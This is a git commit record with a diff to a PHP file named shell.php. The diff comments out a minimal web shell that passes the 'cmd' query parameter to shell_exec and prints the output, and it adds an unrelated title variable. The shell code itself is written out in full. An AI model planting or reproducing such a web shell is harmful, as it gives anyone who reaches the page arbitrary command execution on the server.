fd4d8fb8a02d61878ba29db088ca7a73712ee05c
Chigozie <87097037+GhoulKingR@users.noreply.github.com>
2025-11-19 00:04:37 +0100

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,6 +1,7 @@
 <?php
-echo "hey I'm a shell";
-$cmd = $_GET['cmd'];
-$output = shell_exec($cmd);
-echo "<p>$output</p>";
+// echo "hey I'm a shell";
+// $cmd = $_GET['cmd'];
+// $output = shell_exec($cmd);
+// echo "<p>$output</p>";
+$tite = "Changed title";
 ?>
